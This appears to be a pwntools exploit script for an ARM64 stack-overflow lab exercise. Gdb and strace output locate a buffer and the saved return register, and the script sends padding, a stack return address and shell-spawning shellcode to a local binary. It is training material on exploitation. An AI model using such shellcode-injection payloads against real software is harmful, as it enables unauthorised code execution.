#!/usr/bin/python

"""
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004006c0 <+0>:	stp	x29, x30, [sp, #-32]!
   0x00000000004006c4 <+4>:	mov	x29, sp
   0x00000000004006c8 <+8>:	str	w0, [x29, #28]
   0x00000000004006cc <+12>:	str	x1, [x29, #16]
   0x00000000004006d0 <+16>:	bl	0x400674 <vulnerable>
   0x00000000004006d4 <+20>:	mov	w0, #0x0                   	// #0
   0x00000000004006d8 <+24>:	ldp	x29, x30, [sp], #32
   0x00000000004006dc <+28>:	ret
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x40067c: file src/04-shellcode-static.c, line 6.
(gdb) b *0x00000000004006d8
Breakpoint 2 at 0x4006d8: file src/04-shellcode-static.c, line 20.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/04-shellcode-static.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ffd80 ""
(gdb) c
Continuing.

Breakpoint 2, main (argc=1, argv=0x40007fff58) at src/04-shellcode-static.c:20
20	}
(gdb) i r $sp
sp             0x40007ffe00	0x40007ffe00
"""

"""
$ qemu-aarch64 -L /usr/aarch64-linux-gnu/ -strace ./bin/arm64/04-shellcode-static
...
17997 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
17997 mmap(NULL,1413976,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0000004000852000
...
"""

import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/04-shellcode-static'
libc_path = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

saved_x30_addr = 0x40007ffe00 + 8
buffer_addr = 0x40007ffd80
libc_addr = 0x0000004000852000

shellcode = asm(shellcraft.sh())

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_x30_addr - buffer_addr)
payload += p64(saved_x30_addr + 8)
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
